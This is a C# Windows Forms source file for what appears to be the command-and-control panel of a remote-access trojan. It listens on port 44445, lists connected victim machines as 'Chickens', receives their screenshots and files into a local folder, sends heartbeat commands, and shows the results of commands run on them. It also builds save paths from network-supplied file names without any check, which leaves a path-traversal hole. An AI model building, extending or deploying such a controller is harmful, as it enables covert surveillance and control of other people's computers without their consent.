using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Threading;
using Season.Net;
using System.Diagnostics;
using System.IO;

namespace RemoteControler
{
    public partial class RCForm : Form
    {
        SSprotocolServer server;
        List<ClientBean> Clients = new List<ClientBean>();
        CtrlForm ctrlForm = new CtrlForm();
        Mutex listMutex = new Mutex();
        public RCForm()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }


        private void RCForm_Load(object sender, EventArgs e)
        {
            server = new SSprotocolServer();
            server.OnRecv += this.OnRecv;
            server.OnDisconnect += this.OnDisconnect;
        }
        private void BtnStart_Click(object sender, EventArgs e)
        {
            server.Start(44445);
            BtnStart.Enabled = false;
        }
        private void BtnRefresh_Click(object sender, EventArgs e)
        {
            listMutex.WaitOne();
            Clients.Clear();
            LstChickens.Items.Clear();
            listMutex.ReleaseMutex();
        }


        private void OnRecv(ClientBean client, byte[] recvbuff)
        {
            string str = Encoding.Default.GetString(recvbuff);
            Debug.WriteLine(str);
            if (str.StartsWith("File", StringComparison.OrdinalIgnoreCase))
            {
                int msgPos = 20;
                string fileName = Encoding.Default.GetString(recvbuff, msgPos, 255).TrimEnd('\0');
                msgPos += 255;

                Debug.WriteLine(fileName);
                int fileOffset = BitConverter.ToInt32(recvbuff, msgPos);
                msgPos += sizeof(int);
                int fileCounts = BitConverter.ToInt32(recvbuff, msgPos);
                msgPos += sizeof(int);

                if (fileName.StartsWith("temp_screen_"))
                {
                    long time = long.Parse(fileName.Substring(12));
                    DateTime dt = new DateTime(1970, 1, 1, 8, 0, 0);    //UTC+8
                    dt = dt.AddSeconds(time);
                    fileName = dt.ToString("yyyy-MM-dd HH.mm.ss") + ".bmp";
                }
                string filepath = @"D:\CtrlService_Recvs\" + fileName;

                FileStream file = new FileStream(filepath, fileOffset == 0 ? FileMode.Create : FileMode.Append);
                file.Write(recvbuff, msgPos, fileCounts);
                file.Close();
            }

            if (str.StartsWith("Chicken", StringComparison.OrdinalIgnoreCase))
            {
                listMutex.WaitOne();
                if (!Clients.Contains(client))
                {
                    Clients.Add(client);
                    LstChickens.Items.Add(client);
                }
                if (str.Length > "Chicken ".Length)
                    LstChickens.Items[Clients.IndexOf(client)] = str.Substring("Chicken ".Length);
                listMutex.ReleaseMutex();
                server.Send(client, BitConverter.GetBytes(SSprotocol.CMD_BEAT));
            }

            if (str.StartsWith("Result", StringComparison.OrdinalIgnoreCase))
            {
                ctrlForm.FeedBack(str);
            }

        }

        private void OnDisconnect(ClientBean client)
        {
            listMutex.WaitOne();
            if (Clients.Contains(client))
            {
                if (ctrlForm.cb == client)
                    ctrlForm.Hide();
                int index = Clients.IndexOf(client);
                LstChickens.Items.RemoveAt(index);
                Clients.RemoveAt(index);
            }
            listMutex.ReleaseMutex();
        }


        private void RCForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon.Dispose();
            System.Environment.Exit(0);
        }






        private void RCForm_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
            }
        }


        private void notifyIcon_MouseClick(object sender, MouseEventArgs e)
        {
            if (this.Visible == false)
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
                this.BringToFront();
            }
            else
            {
                this.Hide();
            }
        }

        private void LstChickens_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            listMutex.WaitOne();
            if (LstChickens.SelectedIndex != -1)
            {
                ctrlForm.LoadClient(Clients[LstChickens.SelectedIndex], server, (string)LstChickens.Items[LstChickens.SelectedIndex]);
                ctrlForm.Show();
            }
            listMutex.ReleaseMutex();
        }




    }
}
